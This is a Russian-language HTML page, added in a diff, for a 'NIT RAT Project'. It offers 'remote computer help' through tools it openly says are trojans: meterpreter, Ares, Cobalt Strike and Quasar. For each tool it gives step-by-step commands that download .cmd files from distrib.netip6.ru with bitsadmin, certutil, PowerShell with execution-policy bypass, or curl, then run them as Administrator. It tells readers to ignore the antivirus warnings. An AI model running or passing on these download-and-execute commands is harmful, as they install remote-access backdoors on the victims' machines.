@@ -1,0 +1,181 @@
+<h1>NIT RAT Project</h1>
+<p>Данный проект предназначен для оказания удалённой компьютерной помощи
+пользователю в случае, если по каким-то причинам компьютерный мастер не
+может прийти в дом/офис. Помощь оказывается через выделенные сервера
+NIT.</p>
+<p><strong>Примечание</strong>. Для запуска этих программ на компьютере
+пользователя должны быть установлены .Net Framework 4, NIT
+TinyExclusion, NIT TinyExeFiles. Прежде, чем воспользоваться данной
+помощью, необходимо установить данные программы.</p>
+<p><strong>Примечание</strong>. Антивирусные программы будут
+воспринимать данное программное обеспечение как содержащее вирусы. Это
+действительно так. Все перечисленные ниже программы относятся к так
+называемой группе Remote Access Tool (средства удалённого доступа). Эти
+средства автоматически попадают в чёрные списки антивирусных программ
+как потенциально опасные (догадались почему?), и исключают из него
+только платные и условно-бесплатные сервисы (типа RMS, AnyDesk,
+TeamViewer и т.д.). Поскольку программисты искали бесплатное решение,
+пришлось брать за основу троянцы. Но пользователю беспокоится нечего.
+Программа скачивается, запускается на компьютере и остаётся активной
+только до первой перезагрузки. К тому же она хорошо детектируется любым
+антивирусом. Не запущенная программа вообще не представляет никакой
+опасности. Так что личные данные пользователя никуда не утекают, чего
+нельзя сказать о многих коммерческих продуктах...</p>
+<h2>Получение помощи</h2>
+<p>Для получения помощи вначале уточните, какой программой будет
+пользоваться мастер. Данные программы не взаимозаменяемые, и только
+мастер может уточнить использование программы в каждом конкретном
+случае. Далее необходимо скачать и установить программу.</p>
+<p>Способ 1 подходит, если вы сидите за компьютером, и можете скачивать
+файлы и устанавливать программы сами. Самый распространённый случай.</p>
+<p>Способ 2 подходит, если вы имеете только удалённый консольный доступ
+к компьютеру или серверу, можете подавать ему команды из командной
+строки, но не обязательно имеете возможность получить ответ. Такое
+случается, например, когда вы «вдруг» потеряли доступ к удалённой машине
+Windows, а вам нужно срочно его восстановить. Более подробно об этих
+способах смотри файл <em>nit-adjust-run</em>.</p>
+<h4>Программа meterpreter</h4>
+<p>Способ 1:</p>
+<p>Загрузите файл по ссылке и запустите его в папке «Загрузки»:</p>
+<p><a
+href="http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-meterpreter-remote-RAT.bat">http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-meterpreter-remote-RAT.bat</a></p>
+<p>Способ 2:</p>
+<p>Последовательно выполните следующие команды на удалённом
+компьютере/сервере:</p>
+<p>Команда 1:</p>
+<pre class="text"><code>bitsadmin.exe /Transfer RemoteEnable00 /DOWNLOAD /PRIORITY FOREGROUND http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-run-00.cmd C:\Users\Администратор\nit-RAT-meterpreter-run-00.cmd</code></pre>
+<p>(работает только в командных файлах или при виртуальном доступе),
+или</p>
+<pre class="text"><code>certutil.exe -urlcache -f http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-run-00.cmd C:\Users\Администратор\nit-RAT-meterpreter-run-00.cmd</code></pre>
+<p>(часто не запускается, блокируется антивирусом), или</p>
+<pre class="text"><code>powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(&#39;http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-run-00.cmd&#39;, &#39;C:\Users\Администратор\nit-RAT-meterpreter-run-00.cmd&#39;)</code></pre>
+<p>(требует установленного powershell 2.0+, .Net Framework 3.5+),
+или</p>
+<pre class="text"><code>powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri &#39;http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-run-00.cmd&#39; -OutFile &#39;C:\Users\Администратор\nit-RAT-meterpreter-run-00.cmd&#39;</code></pre>
+<p>(требует установленного powershell 3.0+, Net Framework 4+), или</p>
+<pre class="text"><code>c:\Util\curl.exe http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-run-00.cmd -o C:\Users\Администратор\nit-RAT-meterpreter-run-00.cmd</code></pre>
+<p>(работает всегда, но требует предварительной настройки)</p>
+<p>Команда 2:</p>
+<pre class="text"><code>cmd.exe /c C:\Users\Администратор\nit-RAT-meterpreter-run-00.cmd</code></pre>
+<h4>Программа ares</h4>
+<p>Способ 1:</p>
+<p>Загрузите файл по ссылке и запустите его в папке «Загрузки»:</p>
+<p><a
+href="http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-ares-remote-RAT.bat">http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-ares-remote-RAT.bat</a></p>
+<p>Способ 2:</p>
+<p>Последовательно выполните следующие команды на удалённом
+компьютере/сервере:</p>
+<p>Команда 1:</p>
+<pre class="text"><code>bitsadmin.exe /Transfer RemoteEnable00 /DOWNLOAD /PRIORITY FOREGROUND http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-ares-run-00.cmd C:\Users\Администратор\nit-RAT-ares-run-00.cmd</code></pre>
+<p>(работает только в командных файлах или при виртуальном доступе),
+или</p>
+<pre class="text"><code>certutil.exe -urlcache -f http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-ares-run-00.cmd C:\Users\Администратор\nit-RAT-ares-run-00.cmd</code></pre>
+<p>(часто не запускается, блокируется антивирусом), или</p>
+<pre class="text"><code>powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(&#39;http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-ares-run-00.cmd&#39;, &#39;C:\Users\Администратор\nit-RAT-ares-run-00.cmd&#39;)</code></pre>
+<p>(требует установленного powershell 2.0+, .Net Framework 3.5+),
+или</p>
+<pre class="text"><code>powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri &#39;http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-ares-run-00.cmd&#39; -OutFile &#39;C:\Users\Администратор\nit-RAT-ares-run-00.cmd&#39;</code></pre>
+<p>(требует установленного powershell 3.0+, Net Framework 4+), или</p>
+<pre class="text"><code>c:\Util\curl.exe http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-ares-run-00.cmd -o C:\Users\Администратор\nit-RAT-ares-run-00.cmd</code></pre>
+<p>(работает всегда, но требует предварительной настройки)</p>
+<p>Команда 2:</p>
+<pre class="text"><code>cmd.exe /c C:\Users\Администратор\nit-RAT-ares-run-00.cmd</code></pre>
+<h4>Программа Cobalt Strike (не
+игра)</h4>
+<p>Способ 1:</p>
+<p>Загрузите файл по ссылке и запустите его в папке «Загрузки»:</p>
+<p><a
+href="http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-coba-remote-RAT.bat">http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-coba-remote-RAT.bat</a></p>
+<p>Способ 2:</p>
+<p>Последовательно выполните следующие команды на удалённом
+компьютере/сервере:</p>
+<p>Команда 1:</p>
+<pre class="text"><code>bitsadmin.exe /Transfer RemoteEnable00 /DOWNLOAD /PRIORITY FOREGROUND http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-coba-run-00.cmd C:\Users\Администратор\nit-RAT-coba-run-00.cmd</code></pre>
+<p>(работает только в командных файлах или при виртуальном доступе),
+или</p>
+<pre class="text"><code>certutil.exe -urlcache -f http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-coba-run-00.cmd C:\Users\Администратор\nit-RAT-coba-run-00.cmd</code></pre>
+<p>(часто не запускается, блокируется антивирусом), или</p>
+<pre class="text"><code>powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(&#39;http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-coba-run-00.cmd&#39;, &#39;C:\Users\Администратор\nit-RAT-coba-run-00.cmd&#39;)</code></pre>
+<p>(требует установленного powershell 2.0+, .Net Framework 3.5+),
+или</p>
+<pre class="text"><code>powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri &#39;http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-coba-run-00.cmd&#39; -OutFile &#39;C:\Users\Администратор\nit-RAT-coba-run-00.cmd&#39;</code></pre>
+<p>(требует установленного powershell 3.0+, Net Framework 4+), или</p>
+<pre class="text"><code>c:\Util\curl.exe http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-coba-run-00.cmd -o C:\Users\Администратор\nit-RAT-coba-run-00.cmd</code></pre>
+<p>(работает всегда, но требует предварительной настройки)</p>
+<p>Команда 2:</p>
+<pre class="text"><code>cmd.exe /c C:\Users\Администратор\nit-RAT-coba-run-00.cmd</code></pre>
+<h4>Программа Quasar (не игра)</h4>
+<p>Способ 1:</p>
+<p>Загрузите файл по ссылке и запустите его в папке «Загрузки»:</p>
+<p><a
+href="http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-QUASAR-remote-RAT.bat">http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-QUASAR-remote-RAT.bat</a></p>
+<p>Способ 2:</p>
+<p>Последовательно выполните следующие команды на удалённом
+компьютере/сервере:</p>
+<p>Команда 1:</p>
+<pre class="text"><code>bitsadmin.exe /Transfer RemoteEnable00 /DOWNLOAD /PRIORITY FOREGROUND http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Quasar-run-00.cmd C:\Users\Администратор\nit-RAT-Quasar-run-00.cmd</code></pre>
+<p>(работает только в командных файлах или при виртуальном доступе),
+или</p>
+<pre class="text"><code>certutil.exe -urlcache -f http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Quasar-run-00.cmd C:\Users\Администратор\nit-RAT-Quasar-run-00.cmd</code></pre>
+<p>(часто не запускается, блокируется антивирусом), или</p>
+<pre class="text"><code>powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(&#39;http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Quasar-run-00.cmd&#39;, &#39;C:\Users\Администратор\nit-RAT-Quasar-run-00.cmd&#39;)</code></pre>
+<p>(требует установленного powershell 2.0+, .Net Framework 3.5+),
+или</p>
+<pre class="text"><code>powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri &#39;http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Quasar-run-00.cmd&#39; -OutFile &#39;C:\Users\Администратор\nit-RAT-Quasar-run-00.cmd&#39;</code></pre>
+<p>(требует установленного powershell 3.0+, Net Framework 4+), или</p>
+<pre class="text"><code>c:\Util\curl.exe http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Quasar-run-00.cmd -o C:\Users\Администратор\nit-RAT-Quasar-run-00.cmd</code></pre>
+<p>(работает всегда, но требует предварительной настройки)</p>
+<p>Команда 2:</p>
+<pre class="text"><code>cmd.exe /c C:\Users\Администратор\nit-RAT-Quasar-run-00.cmd</code></pre>
+<h2>Тестовые программы</h2>
+<p>Данные программы используются только для внутренних тестов сервера и
+для помощи пользователям не используются. Пользователю их запускать ни в
+коем случае не нужно (возможна нестабильная работа компьютера).</p>
+<h4>Программа meterpreter
+(локальный запуск)</h4>
+<p>Способ 1:</p>
+<p>Загрузите файл по ссылке и запустите его в папке «Загрузки»:</p>
+<p><a
+href="http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-meterpreter-local-RAT.bat">http://distrib.netip6.ru:80/NIT/RAT/download.php?file=nit-meterpreter-local-RAT.bat</a></p>
+<p>Способ 2:</p>
+<p>Последовательно выполните следующие команды на удалённом
+компьютере/сервере:</p>
+<p>Команда 1:</p>
+<pre class="text"><code>bitsadmin.exe /Transfer RemoteEnable00 /DOWNLOAD /PRIORITY FOREGROUND http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-loc-run-00.cmd C:\Users\Администратор\nit-RAT-meterpreter-loc-run-00.cmd</code></pre>
+<p>(работает только в командных файлах или при виртуальном доступе),
+или</p>
+<pre class="text"><code>certutil.exe -urlcache -f http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-loc-run-00.cmd C:\Users\Администратор\nit-RAT-meterpreter-loc-run-00.cmd</code></pre>
+<p>(часто не запускается, блокируется антивирусом), или</p>
+<pre class="text"><code>powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(&#39;http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-loc-run-00.cmd&#39;, &#39;C:\Users\Администратор\nit-RAT-meterpreter-loc-run-00.cmd&#39;)</code></pre>
+<p>(требует установленного powershell 2.0+, .Net Framework 3.5+),
+или</p>
+<pre class="text"><code>powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri &#39;http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-loc-run-00.cmd&#39; -OutFile &#39;C:\Users\Администратор\nit-RAT-meterpreter-loc-run-00.cmd&#39;</code></pre>
+<p>(требует установленного powershell 3.0+, Net Framework 4+), или</p>
+<pre class="text"><code>c:\Util\curl.exe http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-meterpreter-loc-run-00.cmd -o C:\Users\Администратор\nit-RAT-meterpreter-loc-run-00.cmd</code></pre>
+<p>(работает всегда, но требует предварительной настройки)</p>
+<p>Команда 2:</p>
+<pre class="text"><code>cmd.exe /c C:\Users\Администратор\nit-RAT-meterpreter-loc-run-00.cmd</code></pre>
+<h4>Программа Template (ничего
+не делает)</h4>
+<p>Способ 1:</p>
+<p>Загрузите файл по ссылке и запустите его в папке «Загрузки»:</p>
+<p><a
+href="http://distrib.netip6.ru:80/NIT/RAT/download.php?file=DnRn-RAT-Template.bat">http://distrib.netip6.ru:80/NIT/RAT/download.php?file=DnRn-RAT-Template.bat</a></p>
+<p>Способ 2:</p>
+<p>Последовательно выполните следующие команды на удалённом
+компьютере/сервере:</p>
+<p>Команда 1:</p>
+<pre class="text"><code>bitsadmin.exe /Transfer RemoteEnable00 /DOWNLOAD /PRIORITY FOREGROUND http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Template-run-00.cmd C:\Users\Администратор\nit-RAT-Template-run-00.cmd</code></pre>
+<p>(работает только в командных файлах или при виртуальном доступе),
+или</p>
+<pre class="text"><code>certutil.exe -urlcache -f http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Template-run-00.cmd C:\Users\Администратор\nit-RAT-Template-run-00.cmd</code></pre>
+<p>(часто не запускается, блокируется антивирусом), или</p>
+<pre class="text"><code>powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command (New-Object System.Net.WebClient).DownloadFile(&#39;http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Template-run-00.cmd&#39;, &#39;C:\Users\Администратор\nit-RAT-Template-run-00.cmd&#39;)</code></pre>
+<p>(требует установленного powershell 2.0+, .Net Framework 3.5+),
+или</p>
+<pre class="text"><code>powershell.exe -NoLogo -NoProfile -WindowStyle Normal -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri &#39;http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Template-run-00.cmd&#39; -OutFile &#39;C:\Users\Администратор\nit-RAT-Template-run-00.cmd&#39;</code></pre>
+<p>(требует установленного powershell 3.0+, Net Framework 4+), или</p>
+<pre class="text"><code>c:\Util\curl.exe http://distrib.netip6.ru:80/NIT/RAT/nit-RAT-Template-run-00.cmd -o C:\Users\Администратор\nit-RAT-Template-run-00.cmd</code></pre>
+<p>(работает всегда, но требует предварительной настройки)</p>
+<p>Команда 2:</p>
+<pre class="text"><code>cmd.exe /c C:\Users\Администратор\nit-RAT-Template-run-00.cmd</code></pre>
